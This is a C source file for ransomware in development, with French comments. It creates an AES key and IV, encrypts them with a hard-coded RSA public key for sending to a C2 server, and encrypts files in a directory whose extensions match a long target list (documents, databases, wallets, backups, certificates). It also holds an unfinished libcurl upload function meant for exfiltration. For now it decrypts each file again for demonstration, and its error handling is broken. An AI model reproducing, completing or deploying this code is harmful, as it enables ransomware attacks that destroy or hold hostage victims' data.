#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <dirent.h>
#include <time.h>
#include <curl/curl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#include <openssl/evp.h>
#include <openssl/aes.h>

#include <openssl/rand.h>

#include <openssl/err.h>

#include "files.h"
#include "encryption.h"

#define RSA_KEY_SIZE 4096

void sendFileToApi(const char *path, const char *api);

// Liste des extensions à chiffrer
const char *extensions[] = {".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", 
                            ".csv", ".d3dbsp", ".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", 
                            ".qdf", ".gdb", ".tax", ".pkpass", ".bc6", ".bc7", ".bkp", ".qic", ".bkf", 
                            ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", ".hplg", 
                            ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo", 
                            ".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid", ".ncf", 
                            ".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip", 
                            ".fpk", ".mlx", ".kf", ".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x", 
                            ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", 
                            ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0", ".dba", ".rofl", ".hkx", 
                            ".bar", ".upk", ".das", ".iwi", ".litemod", ".asset", ".forge", ".ltx", ".bsa", 
                            ".apk", ".re4", ".sav", ".lbf", ".slm", ".bik", ".epk", ".rgss3a", ".pak", ".big", 
                            ".wallet", ".wotreplay", ".xxx", ".desc", ".py", ".m3u", ".flv", ".js", ".css", 
                            ".rb", ".png", ".jpeg", ".jpg", ".txt", ".p7c", ".p7b", ".p12", ".pfx", ".pem", 
                            ".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d", ".rw2", ".rwl", 
                            ".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2", 
                            ".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr", ".dng", ".jpe", ".cdr", ".indd", ".ai", 
                            ".eps", ".pdf", ".pdd", ".psd", ".dbf", ".mdf", ".wb2", ".rtf", ".wpd", ".dxg", ".xf", 
                            ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx", ".ppt", ".xlk", ".xlsb", ".xlsm", 
                            ".xlsx", ".xls", ".wps", ".docm", ".docx", ".doc", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt"};

const size_t num_extensions = sizeof(extensions) / sizeof(extensions[0]);

int main(){

    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();

    //Generate AES key and IV
    unsigned char key[32];
    size_t key_size = sizeof(key);
    RAND_bytes(key, key_size);

    printf("Generated AES key:\n");
    char key_lisible[65]; // 32 caractères hexadécimaux + caractère de fin de chaîne
    for (size_t i = 0; i < key_size; ++i) {
        sprintf(&key_lisible[i * 2], "%02x", key[i]);
    }
    printf("%s\n", key_lisible);

    unsigned char iv[16];
    size_t iv_size = sizeof(iv);
    RAND_bytes(iv, iv_size);

    printf("Generated IV:\n");
    char iv_lisible[33]; // 16 caractères hexadécimaux + caractère de fin de chaîne
    for (size_t i = 0; i < iv_size; ++i) {
        sprintf(&iv_lisible[i * 2], "%02x", iv[i]);
    }
    printf("%s\n", iv_lisible);

    FILE *file_pointer;
    file_pointer = fopen("aes_key.txt", "w"); // Ouvre le fichier en mode écriture

    if (file_pointer == NULL) {
        printf("Error: cannot open the file.\n");
        return 1;
    }

    fwrite(key_lisible, sizeof(char), 64, file_pointer); // Écrit la clé dans le fichier
    fwrite("\n", sizeof(char), 1, file_pointer); // Écrit une nouvelle ligne dans le fichier
    fwrite(iv_lisible, sizeof(char), 32, file_pointer); // Écrit l'IV dans le fichier

    fclose(file_pointer); // Ferme le fichier


    //Authentication string
    static const unsigned char aad[] = "Cyan";

    //Encrypt the AES key and IV with the RSA public key
    const char* public_key_pem = "-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAl+Ddet9QlwRgiq0m5bks\nK1pECg8k/lPvHjFbdsz2IPWA2annk/aYmN8DZR4+fz1NSy6mcxHoCJPh9mK4ngJ8\nezml7P5008MsDSohPQdaCDlZu3YV7mQGrtx1cZgxN8FjGszAAhU0BovdKM6OHmKb\nvPH08tV/SZuu0skcDDVTHZwrm4GYuFIi6dBLyIKuzYytXNt2Y7YT9r9NINVdpIf5\nnzY+6KobIjX/B3z4IvF8DHyESf8/u+SNAfe+kTK/INO8/TqUY1Y568QH6dbPro7z\nAABa6tj62d7mVD68vaQI6nh5Vh7TN0Ps6SnjBDV+NbTKq1jA5dEH+I9EMJx69n0m\nxyYpt5q5mRdn0ya7VqNkUT7jTZQ2gyPy0Yf8u8jBZ6lpaEvnqltlmsGpx3SAjKkl\nrrnDXqq+VopCIEFBVps1opjZtk5jafp5TP/JCzNFzW3ajaAZdWFbppHCWeegE4d7\nVOJqh+w3jpxAzbAUYu5Sykc2sWZZep82FhBSlqeDBJ1PmOsi5oiMSgAnUNGzaBOn\n1ZWjvXRTAC9zd/EyOzKoQ4eQh7UJYsIdzbDMdgq15Cesgp18+ohvcdtnmAHQ//mH\nKU1TOQ8qlPjvIeYAdXQT+qwXNPTadxszucJs3c+7BLxJMXD/bMh4Sq6PYza3Rg27\nF07u/gwEJGvCzV87VvqAj90CAwEAAQ==\n-----END PUBLIC KEY-----\n";

    const unsigned char* encrypted_aes_key = encrypt_RSA(public_key_pem, key, key_size);
    const unsigned char* encrypted_iv = encrypt_RSA(public_key_pem, iv, iv_size);

    //Send the encrypted AES key and iv to C2

    OPENSSL_free(encrypted_aes_key);
    OPENSSL_free(encrypted_iv);

    // List all the files we want to encrypt
    const char *path = "/home/lorette/test1";
    PathList pathList;
    initPathList(&pathList);

    linuxListFiles(path, &pathList);

    //Browse files
    for (size_t i = 0; i < pathList.count; ++i) {

        if (strstr(pathList.paths[i], "basic_c/") != NULL) {
            continue; // Ignorer le dossier "basic_c" et ses fichiers
        }
        
        // Check if the file has one of the specified extensions
        char *extension = strrchr(pathList.paths[i], '.');
        if (extension != NULL) {
            for (size_t j = 0; j < num_extensions; ++j) {
                if (strcmp(extension, extensions[j]) == 0) {
                    // Encrypt the file
                    encrypt_file(key, iv, aad, pathList.paths[i]);
                    // Decrypt the file (for demonstration purposes)
                    sleep(1);
                    char encrypted_path[1024];
                    snprintf(encrypted_path, sizeof(encrypted_path), "%s.cha", pathList.paths[i]);
                    decryptFile(key, iv, aad, encrypted_path);
                    break;
                }
            }
        }
    }

    freePathList(&pathList);

    //Redirect to C2's web page for instructions

    return 0;
}

//WIP
void sendFileToApi(const char *path, const char *api){
    /*Documentation: https://curl.se/libcurl/c/fileupload.html */
    CURL *curl;
    CURLcode res;
    struct stat file_info;
    curl_off_t speed_upload, total_time;
    FILE *fd;

    fd = fopen("debugit", "rb"); /* open file to upload */
    if(!fd)
        //Woops

        /* to get the file size */
        if(fstat(fileno(fd), &file_info) != 0)
            //Woops

            curl = curl_easy_init();
    if(curl){
        /* upload to this place */
        curl_easy_setopt(curl, CURLOPT_URL,
                         api);

        /* tell it to "upload" to the URL */
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

        /* set where to read from (on Windows you need to use READFUNCTION too) */
        curl_easy_setopt(curl, CURLOPT_READDATA, fd);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            //Woops
        }

        curl_easy_cleanup(curl);
    }
    fclose(fd);

}